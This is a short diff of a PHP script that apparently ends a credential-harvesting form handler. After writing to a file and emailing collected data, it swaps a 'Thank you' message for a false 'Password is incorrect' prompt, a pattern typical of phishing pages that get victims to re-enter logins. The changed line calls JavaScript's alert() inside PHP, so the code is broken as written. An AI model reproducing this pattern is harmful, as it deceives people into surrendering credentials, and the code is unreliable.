@@ -25,7 +25,7 @@ fclose($open);
 
 mail($to,$subject,$message, $from);
 
-print "Thank you";
+alert ("Password is incorrect");
 
 
 ?>
